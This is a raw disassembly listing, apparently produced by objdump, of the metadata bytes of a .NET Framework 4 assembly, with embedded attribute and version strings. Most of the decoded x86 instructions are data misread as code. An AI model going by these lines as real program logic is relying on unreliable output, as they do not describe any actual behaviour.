  40c382:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c388:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c38e:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c391:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c397:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c39d:	0a 04 00             	or     (%eax,%eax,1),%al
  40c3a0:	01 01                	add    %eax,(%ecx)
  40c3a2:	0a 04 00             	or     (%eax,%eax,1),%al
  40c3a5:	00 12                	add    %dl,(%edx)
  40c3a7:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c3ac:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c3b2:	02 03                	add    (%ebx),%al
  40c3b4:	00 00                	add    %al,(%eax)
  40c3b6:	1c 03                	sbb    $0x3,%al
  40c3b8:	00 00                	add    %al,(%eax)
  40c3ba:	08 04 00             	or     %al,(%eax,%eax,1)
  40c3bd:	01 01                	add    %eax,(%ecx)
  40c3bf:	08 04 00             	or     %al,(%eax,%eax,1)
  40c3c2:	01 02                	add    %eax,(%edx)
  40c3c4:	0e                   	push   %cs
  40c3c5:	0a 00                	or     (%eax),%al
  40c3c7:	04 02                	add    $0x2,%al
  40c3c9:	1c 12                	sbb    $0x12,%al
  40c3cb:	19 12                	sbb    %edx,(%edx)
  40c3cd:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c3d2:	01 01                	add    %eax,(%ecx)
  40c3d4:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c3da:	1c 04                	sbb    $0x4,%al
  40c3dc:	08 00                	or     %al,(%eax)
  40c3de:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c3e4:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c3e7:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c3ed:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c3f0:	00 12                	add    %dl,(%edx)
  40c3f2:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c3f7:	03 08                	add    (%eax),%ecx
  40c3f9:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c3fc:	08 00                	or     %al,(%eax)
  40c3fe:	08 03                	or     %al,(%ebx)
  40c400:	06                   	push   %es
  40c401:	12 29                	adc    (%ecx),%ch
  40c403:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c408:	0e                   	push   %cs
  40c409:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c40e:	05 06 00 01 1d       	add    $0x1d010006,%eax
  40c413:	05 1d 05 05 00       	add    $0x5051d,%eax
  40c418:	01 1d 05 0a 05 00    	add    %ebx,0x50a05
  40c41e:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c424:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c42a:	01 1d 05 0d 07 06    	add    %ebx,0x6070d05
  40c430:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c435:	20 09                	and    %cl,(%ecx)
  40c437:	20 01                	and    %al,(%ecx)
  40c439:	01 15 12 31 01 12    	add    %edx,0x12013112
  40c43f:	20 03                	and    %al,(%ebx)
  40c441:	20 00                	and    %al,(%eax)
  40c443:	1c 03                	sbb    $0x3,%al
  40c445:	20 00                	and    %al,(%eax)
  40c447:	02 03                	add    (%ebx),%al
  40c449:	28 00                	sub    %al,(%eax)
  40c44b:	1c 03                	sbb    $0x3,%al
  40c44d:	06                   	push   %es
  40c44e:	12 20                	adc    (%eax),%ah
  40c450:	0b 20                	or     (%eax),%esp
  40c452:	02 01                	add    (%ecx),%al
  40c454:	12 20                	adc    (%eax),%ah
  40c456:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c45b:	20 04 20             	and    %al,(%eax,%eiz,1)
  40c45e:	00 12                	add    %dl,(%edx)
  40c460:	20 05 20 01 12 20    	and    %al,0x20120120
  40c466:	0e                   	push   %cs
  40c467:	05 20 01 12 20       	add    $0x20120120,%eax
  40c46c:	0a 05 20 01 12 20    	or     0x20120120,%al
  40c472:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c477:	20 08                	and    %cl,(%eax)
  40c479:	03 20                	add    (%eax),%esp
  40c47b:	00 08                	add    %cl,(%eax)
  40c47d:	05 28 01 12 20       	add    $0x20120128,%eax
  40c482:	08 03                	or     %al,(%ebx)
  40c484:	28 00                	sub    %al,(%eax)
  40c486:	08 03                	or     %al,(%ebx)
  40c488:	06                   	push   %es
  40c489:	11 24 03             	adc    %esp,(%ebx,%eax,1)
  40c48c:	06                   	push   %es
  40c48d:	12 1c 04             	adc    (%esp,%eax,1),%bl
  40c490:	20 01                	and    %al,(%ecx)
  40c492:	01 0e                	add    %ecx,(%esi)
  40c494:	04 20                	add    $0x20,%al
  40c496:	01 08                	add    %ecx,(%eax)
  40c498:	0e                   	push   %cs
  40c499:	05 20 01 01 12       	add    $0x12010120,%eax
  40c49e:	39 04 20             	cmp    %eax,(%eax,%eiz,1)
  40c4a1:	01 01                	add    %eax,(%ecx)
  40c4a3:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c4a6:	01 01                	add    %eax,(%ecx)
  40c4a8:	0b 03                	or     (%ebx),%eax
  40c4aa:	20 00                	and    %al,(%eax)
  40c4ac:	0b 03                	or     (%ebx),%eax
  40c4ae:	20 00                	and    %al,(%eax)
  40c4b0:	0a 03                	or     (%ebx),%al
  40c4b2:	20 00                	and    %al,(%eax)
  40c4b4:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c4b9:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c4be:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c4c3:	01 0e                	add    %ecx,(%esi)
  40c4c5:	0e                   	push   %cs
  40c4c6:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c4cb:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c4ce:	01 02                	add    %eax,(%edx)
  40c4d0:	0e                   	push   %cs
  40c4d1:	03 20                	add    (%eax),%esp
  40c4d3:	00 0e                	add    %cl,(%esi)
  40c4d5:	04 20                	add    $0x20,%al
  40c4d7:	01 01                	add    %eax,(%ecx)
  40c4d9:	02 04 20             	add    (%eax,%eiz,1),%al
  40c4dc:	01 01                	add    %eax,(%ecx)
  40c4de:	0c 04                	or     $0x4,%al
  40c4e0:	20 01                	and    %al,(%ecx)
  40c4e2:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c4e8:	1c 04                	sbb    $0x4,%al
  40c4ea:	20 00                	and    %al,(%eax)
  40c4ec:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c4ef:	20 00                	and    %al,(%eax)
  40c4f1:	12 2d 03 28 00 0e    	adc    0xe002803,%ch
  40c4f7:	03 28                	add    (%eax),%ebp
  40c4f9:	00 0a                	add    %cl,(%edx)
  40c4fb:	03 28                	add    (%eax),%ebp
  40c4fd:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c503:	1c 04                	sbb    $0x4,%al
  40c505:	28 00                	sub    %al,(%eax)
  40c507:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c50a:	00 00                	add    %al,(%eax)
  40c50c:	00 00                	add    %al,(%eax)
  40c50e:	04 01                	add    $0x1,%al
  40c510:	00 00                	add    %al,(%eax)
  40c512:	00 04 02             	add    %al,(%edx,%eax,1)
  40c515:	00 00                	add    %al,(%eax)
  40c517:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c51a:	00 00                	add    %al,(%eax)
  40c51c:	00 04 04             	add    %al,(%esp,%eax,1)
  40c51f:	00 00                	add    %al,(%eax)
  40c521:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c528:	06                   	push   %es
  40c529:	00 00                	add    %al,(%eax)
  40c52b:	00 04 07             	add    %al,(%edi,%eax,1)
  40c52e:	00 00                	add    %al,(%eax)
  40c530:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c533:	00 00                	add    %al,(%eax)
  40c535:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c538:	00 00                	add    %al,(%eax)
  40c53a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c53d:	00 00                	add    %al,(%eax)
  40c53f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c542:	00 00                	add    %al,(%eax)
  40c544:	00 06                	add    %al,(%esi)
  40c546:	00 02                	add    %al,(%edx)
  40c548:	0e                   	push   %cs
  40c549:	12 39                	adc    (%ecx),%bh
  40c54b:	08 05 00 01 0e 12    	or     %al,0x120e0100
  40c551:	39 06                	cmp    %eax,(%esi)
  40c553:	00 02                	add    %al,(%edx)
  40c555:	0e                   	push   %cs
  40c556:	05 12 39 05 00       	add    $0x53912,%eax
  40c55b:	01 01                	add    %eax,(%ecx)
  40c55d:	12 39                	adc    (%ecx),%bh
  40c55f:	06                   	push   %es
  40c560:	00 02                	add    %al,(%edx)
  40c562:	01 12                	add    %edx,(%edx)
  40c564:	39 0e                	cmp    %ecx,(%esi)
  40c566:	07                   	pop    %es
  40c567:	00 02                	add    %al,(%edx)
  40c569:	01 12                	add    %edx,(%edx)
  40c56b:	39 1d 05 06 00 02    	cmp    %ebx,0x2000605
  40c571:	01 12                	add    %edx,(%edx)
  40c573:	39 0d 06 00 02 01    	cmp    %ecx,0x1020006
  40c579:	12 39                	adc    (%ecx),%bh
  40c57b:	0c 06                	or     $0x6,%al
  40c57d:	00 02                	add    %al,(%edx)
  40c57f:	01 12                	add    %edx,(%edx)
  40c581:	39 02                	cmp    %eax,(%edx)
  40c583:	06                   	push   %es
  40c584:	00 02                	add    %al,(%edx)
  40c586:	01 12                	add    %edx,(%edx)
  40c588:	39 0b                	cmp    %ecx,(%ebx)
  40c58a:	06                   	push   %es
  40c58b:	00 02                	add    %al,(%edx)
  40c58d:	01 12                	add    %edx,(%edx)
  40c58f:	39 0a                	cmp    %ecx,(%edx)
  40c591:	04 00                	add    $0x0,%al
  40c593:	01 18                	add    %ebx,(%eax)
  40c595:	0e                   	push   %cs
  40c596:	06                   	push   %es
  40c597:	00 02                	add    %al,(%edx)
  40c599:	02 18                	add    (%eax),%bl
  40c59b:	10 02                	adc    %al,(%edx)
  40c59d:	05 20 01 0e 12       	add    $0x120e0120,%eax
  40c5a2:	41                   	inc    %ecx
  40c5a3:	03 00                	add    (%eax),%eax
  40c5a5:	00 0e                	add    %cl,(%esi)
  40c5a7:	04 00                	add    $0x0,%al
  40c5a9:	01 0e                	add    %ecx,(%esi)
  40c5ab:	0e                   	push   %cs
  40c5ac:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c5b2:	d5 0a                	aad    $0xa
  40c5b4:	3a 06                	cmp    (%esi),%al
  40c5b6:	00 01                	add    %al,(%ecx)
  40c5b8:	12 45 12             	adc    0x12(%ebp),%al
  40c5bb:	49                   	dec    %ecx
  40c5bc:	06                   	push   %es
  40c5bd:	00 01                	add    %al,(%ecx)
  40c5bf:	11 48 11             	adc    %ecx,0x11(%eax)
  40c5c2:	48                   	dec    %eax
  40c5c3:	02 06                	add    (%esi),%al
  40c5c5:	09 03                	or     %eax,(%ebx)
  40c5c7:	06                   	push   %es
  40c5c8:	11 48 04             	adc    %ecx,0x4(%eax)
  40c5cb:	00 00                	add    %al,(%eax)
  40c5cd:	00 80 03 06 12 4d    	add    %al,0x4d120603(%eax)
  40c5d3:	06                   	push   %es
  40c5d4:	00 02                	add    %al,(%edx)
  40c5d6:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c5d9:	51                   	push   %ecx
  40c5da:	06                   	push   %es
  40c5db:	00 03                	add    %al,(%ebx)
  40c5dd:	01 09                	add    %ecx,(%ecx)
  40c5df:	09 09                	or     %ecx,(%ecx)
  40c5e1:	05 00 02 02 0e       	add    $0xe020200,%eax
  40c5e6:	0e                   	push   %cs
  40c5e7:	05 00 01 01 12       	add    $0x12010100,%eax
  40c5ec:	20 04 00             	and    %al,(%eax,%eax,1)
  40c5ef:	01 01                	add    %eax,(%ecx)
  40c5f1:	0e                   	push   %cs
  40c5f2:	18 06                	sbb    %al,(%esi)
  40c5f4:	15 12 55 01 15       	adc    $0x15015512,%eax
  40c5f9:	12 59 0a             	adc    0xa(%ecx),%bl
  40c5fc:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40c5ff:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c605:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40c60a:	0e                   	push   %cs
  40c60b:	04 20                	add    $0x20,%al
  40c60d:	00 00                	add    %al,(%eax)
  40c60f:	00 04 40             	add    %al,(%eax,%eax,2)
  40c612:	00 00                	add    %al,(%eax)
  40c614:	00 04 10             	add    %al,(%eax,%edx,1)
  40c617:	00 00                	add    %al,(%eax)
  40c619:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c61c:	01 0e                	add    %ecx,(%esi)
  40c61e:	0e                   	push   %cs
  40c61f:	06                   	push   %es
  40c620:	20 01                	and    %al,(%ecx)
  40c622:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c627:	20 02                	and    %al,(%edx)
  40c629:	02 1d 05 1d 05 03    	add    0x3051d05,%bl
  40c62f:	06                   	push   %es
  40c630:	11 74 03 06          	adc    %esi,0x6(%ebx,%eax,1)
  40c634:	11 70 04             	adc    %esi,0x4(%eax)
  40c637:	20 01                	and    %al,(%ecx)
  40c639:	01 08                	add    %ecx,(%eax)
  40c63b:	08 01                	or     %al,(%ecx)
  40c63d:	00 08                	add    %cl,(%eax)
  40c63f:	00 00                	add    %al,(%eax)
  40c641:	00 00                	add    %al,(%eax)
  40c643:	00 1e                	add    %bl,(%esi)
  40c645:	01 00                	add    %eax,(%eax)
  40c647:	01 00                	add    %eax,(%eax)
  40c649:	54                   	push   %esp
  40c64a:	02 16                	add    (%esi),%dl
  40c64c:	57                   	push   %edi
  40c64d:	72 61                	jb     0x40c6b0
  40c64f:	70 4e                	jo     0x40c69f
  40c651:	6f                   	outsl  %ds:(%esi),(%dx)
  40c652:	6e                   	outsb  %ds:(%esi),(%dx)
  40c653:	45                   	inc    %ebp
  40c654:	78 63                	js     0x40c6b9
  40c656:	65 70 74             	gs jo  0x40c6cd
  40c659:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c660:	77 73                	ja     0x40c6d5
  40c662:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c668:	71 08                	jno    0x40c672
  40c66a:	01 00                	add    %eax,(%eax)
  40c66c:	02 00                	add    (%eax),%al
  40c66e:	00 00                	add    %al,(%eax)
  40c670:	00 00                	add    %al,(%eax)
  40c672:	05 01 00 00 00       	add    $0x1,%eax
  40c677:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c67a:	00 07                	add    %al,(%edi)
  40c67c:	31 2e                	xor    %ebp,(%esi)
  40c67e:	30 2e                	xor    %ch,(%esi)
  40c680:	30 2e                	xor    %ch,(%esi)
  40c682:	30 00                	xor    %al,(%eax)
  40c684:	00 65 01             	add    %ah,0x1(%ebp)
  40c687:	00 29                	add    %ch,(%ecx)
  40c689:	2e 4e                	cs dec %esi
  40c68b:	45                   	inc    %ebp
  40c68c:	54                   	push   %esp
  40c68d:	46                   	inc    %esi
  40c68e:	72 61                	jb     0x40c6f1
  40c690:	6d                   	insl   (%dx),%es:(%edi)
  40c691:	65 77 6f             	gs ja  0x40c703
  40c694:	72 6b                	jb     0x40c701
  40c696:	2c 56                	sub    $0x56,%al
  40c698:	65 72 73             	gs jb  0x40c70e
  40c69b:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c6a2:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c6a5:	72 6f                	jb     0x40c716
  40c6a7:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c6ae:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c6b5:	0e                   	push   %cs
  40c6b6:	14 46                	adc    $0x46,%al
  40c6b8:	72 61                	jb     0x40c71b
  40c6ba:	6d                   	insl   (%dx),%es:(%edi)
  40c6bb:	65 77 6f             	gs ja  0x40c72d
  40c6be:	72 6b                	jb     0x40c72b
  40c6c0:	44                   	inc    %esp
  40c6c1:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c6c8:	61                   	popa
  40c6c9:	6d                   	insl   (%dx),%es:(%edi)
  40c6ca:	65 1f                	gs pop %ds
  40c6cc:	2e 4e                	cs dec %esi
  40c6ce:	45                   	inc    %ebp
  40c6cf:	54                   	push   %esp
  40c6d0:	20 46 72             	and    %al,0x72(%esi)
  40c6d3:	61                   	popa
  40c6d4:	6d                   	insl   (%dx),%es:(%edi)
  40c6d5:	65 77 6f             	gs ja  0x40c747
  40c6d8:	72 6b                	jb     0x40c745
  40c6da:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c6dd:	43                   	inc    %ebx
  40c6de:	6c                   	insb   (%dx),%es:(%edi)
  40c6df:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c6e6:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6e7:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c6ee:	04 49                	add    $0x49,%al
  40c6f0:	74 65                	je     0x40c757
  40c6f2:	6d                   	insl   (%dx),%es:(%edi)
  40c6f3:	00 00                	add    %al,(%eax)
  40c6f5:	03 07                	add    (%edi),%eax
  40c6f7:	01 08                	add    %ecx,(%eax)
  40c6f9:	04 00                	add    $0x0,%al
  40c6fb:	01 08                	add    %ecx,(%eax)
  40c6fd:	0e                   	push   %cs
  40c6fe:	05 20 02 08 08       	add    $0x8080220,%eax
  40c703:	08 03                	or     %al,(%ebx)
  40c705:	07                   	pop    %es
  40c706:	01 02                	add    %eax,(%edx)
  40c708:	05 00 00 12 80       	add    $0x80120000,%eax
  40c70d:	b5 05                	mov    $0x5,%ch
  40c70f:	20 01                	and    %al,(%ecx)
  40c711:	0e                   	push   %cs
  40c712:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c717:	12 80 b9 05 20 00    	adc    0x2005b9(%eax),%al
  40c71d:	12 80 bd 05 20 01    	adc    0x12005bd(%eax),%al
  40c723:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c728:	03 02                	add    (%edx),%eax
  40c72a:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c72f:	14 07                	adc    $0x7,%al
  40c731:	08 0e                	or     %cl,(%esi)
  40c733:	08 1d 12 80 cd 08    	or     %bl,0x8cd8012
  40c739:	12 80 cd 12 80 d1    	adc    -0x2e7fed33(%eax),%al
  40c73f:	12 80 d5 1d 0e 0c    	adc    0xc0e1dd5(%eax),%al
  40c745:	20 03                	and    %al,(%ebx)
  40c747:	01 11                	add    %edx,(%ecx)
  40c749:	80 d9 11             	sbb    $0x11,%cl
  40c74c:	80 dd 11             	sbb    $0x11,%ch
  40c74f:	80 e1 06             	and    $0x6,%cl
  40c752:	20 01                	and    %al,(%ecx)
  40c754:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c759:	20 01                	and    %al,(%ecx)
  40c75b:	08 08                	or     %cl,(%eax)
  40c75d:	07                   	pop    %es
  40c75e:	00 01                	add    %al,(%ecx)
  40c760:	1d 12 80 cd 0e       	sbb    $0xecd8012,%eax
  40c765:	07                   	pop    %es
  40c766:	20 02                	and    %al,(%edx)
  40c768:	01 12                	add    %edx,(%edx)
  40c76a:	80 cd 08             	or     $0x8,%ch
  40c76d:	06                   	push   %es
  40c76e:	20 01                	and    %al,(%ecx)
  40c770:	01 12                	add    %edx,(%edx)
  40c772:	80 f1 09             	xor    $0x9,%cl
  40c775:	20 02                	and    %al,(%edx)
  40c777:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c77c:	80 f5 06             	xor    $0x6,%ch
  40c77f:	20 02                	and    %al,(%edx)
  40c781:	01 12                	add    %edx,(%edx)
  40c783:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c788:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c78b:	09 20                	or     %esp,(%eax)
  40c78d:	03 01                	add    (%ecx),%eax
  40c78f:	12 39                	adc    (%ecx),%bh
  40c791:	02 12                	add    (%edx),%dl
  40c793:	81 01 05 20 00 12    	addl   $0x12002005,(%ecx)
  40c799:	81 05 0b 20 04 01 0e 	addl   $0x981120e,0x104200b
  40c7a0:	12 81 09 
  40c7a3:	11 81 0d 02 09 20    	adc    %eax,0x2009020d(%ecx)
  40c7a9:	04 01                	add    $0x1,%al
  40c7ab:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c7b1:	0c 20                	or     $0x20,%al
  40c7b3:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c7b8:	08 08                	or     %cl,(%eax)
  40c7ba:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c7c0:	01 11                	add    %edx,(%ecx)
  40c7c2:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c7c8:	02 12                	add    (%edx),%dl
  40c7ca:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c7cd:	02 08                	add    (%eax),%cl
  40c7cf:	08 05 20 01 08 12    	or     %al,0x12080120
  40c7d5:	25 06 00 02 08       	and    $0x8020006,%eax
  40c7da:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c7df:	03 08                	add    (%eax),%ecx
  40c7e1:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c7e6:	20 01                	and    %al,(%ecx)
  40c7e8:	01 12                	add    %edx,(%edx)
  40c7ea:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c7f0:	1c 0c                	sbb    $0xc,%al
  40c7f2:	07                   	pop    %es
  40c7f3:	06                   	push   %es
  40c7f4:	1c 02                	sbb    $0x2,%al
  40c7f6:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c7fb:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c801:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c804:	02 07                	add    (%edi),%al
  40c806:	20 02                	and    %al,(%edx)
  40c808:	02 08                	add    (%eax),%cl
  40c80a:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c810:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  40c816:	00 02                	add    %al,(%edx)
  40c818:	0e                   	push   %cs
  40c819:	0e                   	push   %cs
  40c81a:	0e                   	push   %cs
  40c81b:	09 07                	or     %eax,(%edi)
  40c81d:	04 12                	add    $0x12,%al
  40c81f:	81 3d 1d 05 08 05 05 	cmpl   $0xe020005,0x508051d
  40c826:	00 02 0e 
  40c829:	0e                   	push   %cs
  40c82a:	1c 06                	sbb    $0x6,%al
  40c82c:	20 01                	and    %al,(%ecx)
  40c82e:	12 81 3d 0e 06 07    	adc    0x7060e3d(%ecx),%al
  40c834:	03 1d 05 08 08 06    	add    0x6080805,%ebx
  40c83a:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c83f:	20 05 20 01 13 00    	and    %al,0x130120
  40c845:	08 04 07             	or     %al,(%edi,%eax,1)
  40c848:	01 12                	add    %edx,(%edx)
  40c84a:	20 05 20 01 01 13    	and    %al,0x13010120
  40c850:	00 0e                	add    %cl,(%esi)
  40c852:	07                   	pop    %es
  40c853:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c858:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40c85e:	12 20                	adc    (%eax),%ah
  40c860:	09 20                	or     %esp,(%eax)
  40c862:	00 15 11 81 41 01    	add    %dl,0x1418111
  40c868:	13 00                	adc    (%eax),%eax
  40c86a:	07                   	pop    %es
  40c86b:	15 11 81 41 01       	adc    $0x1418111,%eax
  40c870:	12 20                	adc    (%eax),%ah
  40c872:	04 20                	add    $0x20,%al
  40c874:	00 13                	add    %dl,(%ebx)
  40c876:	00 07                	add    %al,(%edi)
  40c878:	07                   	pop    %es
  40c879:	04 05                	add    $0x5,%al
  40c87b:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  40c880:	20 01                	and    %al,(%ecx)
  40c882:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c888:	24 04                	and    $0x4,%al
  40c88a:	00 01                	add    %al,(%ecx)
  40c88c:	0b 0a                	or     (%edx),%ecx
  40c88e:	04 00                	add    $0x0,%al
  40c890:	01 0b                	add    %ecx,(%ebx)
  40c892:	0e                   	push   %cs
  40c893:	04 00                	add    $0x0,%al
  40c895:	01 0b                	add    %ecx,(%ebx)
  40c897:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c89c:	0c 06                	or     $0x6,%al
  40c89e:	00 01                	add    %al,(%ecx)
  40c8a0:	0b 11                	or     (%ecx),%edx
  40c8a2:	81 55 04 00 01 0a 0a 	adcl   $0xa0a0100,0x4(%ebp)
  40c8a9:	04 00                	add    $0x0,%al
  40c8ab:	01 0a                	add    %ecx,(%edx)
  40c8ad:	0e                   	push   %cs
  40c8ae:	04 00                	add    $0x0,%al
  40c8b0:	01 0a                	add    %ecx,(%edx)
  40c8b2:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c8b7:	0c 06                	or     $0x6,%al
  40c8b9:	00 01                	add    %al,(%ecx)
  40c8bb:	0a 11                	or     (%ecx),%dl
  40c8bd:	81 55 04 00 01 0d 0a 	adcl   $0xa0d0100,0x4(%ebp)
  40c8c4:	04 00                	add    $0x0,%al
  40c8c6:	01 0d 0e 07 07 02    	add    %ecx,0x207070e
  40c8cc:	11 24 11             	adc    %esp,(%ecx,%edx,1)
  40c8cf:	81 55 05 00 01 1d 05 	adcl   $0x51d0100,0x5(%ebp)
  40c8d6:	0c 02                	or     $0x2,%al
  40c8d8:	1d 05 07 07 02       	sbb    $0x2070705,%eax
  40c8dd:	1d 05 12 81 59       	sbb    $0x59811205,%eax
  40c8e2:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c8e7:	11 81 61 11 81 65    	adc    %eax,0x65811161(%ecx)
  40c8ed:	11 81 69 07 20 02    	adc    %eax,0x2200769(%ecx)
  40c8f3:	01 0e                	add    %ecx,(%esi)
  40c8f5:	11 81 61 0b 07 06    	adc    %eax,0x6070b61(%ecx)
  40c8fb:	12 20                	adc    (%eax),%ah
  40c8fd:	12 20                	adc    (%eax),%ah
  40c8ff:	1d 0e 0e 08 08       	sbb    $0x8080e0e,%eax
  40c904:	09 00                	or     %eax,(%eax)
  40c906:	02 01                	add    (%ecx),%al
  40c908:	12 81 71 11 81 75    	adc    0x75811171(%ecx),%al
  40c90e:	05 07 01 12 81       	add    $0x81120107,%eax
  40c913:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c918:	81 59 06 00 02 07 1d 	sbbl   $0x1d070200,0x6(%ecx)
  40c91f:	05 08 06 00 02       	add    $0x2000608,%eax
  40c924:	0c 1d                	or     $0x1d,%al
  40c926:	05 08 06 00 02       	add    $0x2000608,%eax
  40c92b:	0d 1d 05 08 06       	or     $0x608051d,%eax
  40c930:	00 02                	add    %al,(%edx)
  40c932:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c938:	02 0b                	add    (%ebx),%cl
  40c93a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c93f:	02 06                	add    (%esi),%al
  40c941:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c946:	02 0a                	add    (%edx),%cl
  40c948:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c94d:	03 12                	add    (%edx),%edx
  40c94f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c956:	07 02 12 
  40c959:	20 02                	and    %al,(%edx)
  40c95b:	04 07                	add    $0x7,%al
  40c95d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c963:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c968:	04 1d                	add    $0x1d,%al
  40c96a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c96f:	06                   	push   %es
  40c970:	07                   	pop    %es
  40c971:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c977:	00 01                	add    %al,(%ecx)
  40c979:	1d 05 0b 1c 07       	sbb    $0x71c0b05,%eax
  40c97e:	0c 12                	or     $0x12,%al
  40c980:	81 7d 1d 05 1d 05 0e 	cmpl   $0xe051d05,0x1d(%ebp)
  40c987:	08 1d 12 41 08 12    	or     %bl,0x12084112
  40c98d:	41                   	inc    %ecx
  40c98e:	12 41 12             	adc    0x12(%ecx),%al
  40c991:	81 81 12 81 85 12 81 	addl   $0x48981,0x12858112(%ecx)
  40c998:	89 04 00 
  40c99b:	00 12                	add    %dl,(%edx)
  40c99d:	41                   	inc    %ecx
  40c99e:	05 20 00 12 81       	add    $0x81120020,%eax
  40c9a3:	91                   	xchg   %eax,%ecx
  40c9a4:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40c9a9:	41                   	inc    %ecx
  40c9aa:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c9af:	0e                   	push   %cs
  40c9b0:	06                   	push   %es
  40c9b1:	20 01                	and    %al,(%ecx)
  40c9b3:	01 11                	add    %edx,(%ecx)
  40c9b5:	81 99 06 20 01 01 12 	sbbl   $0x4818112,0x1012006(%ecx)
  40c9bc:	81 81 04 
  40c9bf:	06                   	push   %es
  40c9c0:	12 81 85 09 20 02    	adc    0x2200985(%ecx),%al
  40c9c6:	12 81 85 0e 11 81    	adc    -0x7eeef17b(%ecx),%al
  40c9cc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c9cd:	06                   	push   %es
  40c9ce:	00 03                	add    %al,(%ebx)
  40c9d0:	0e                   	push   %cs
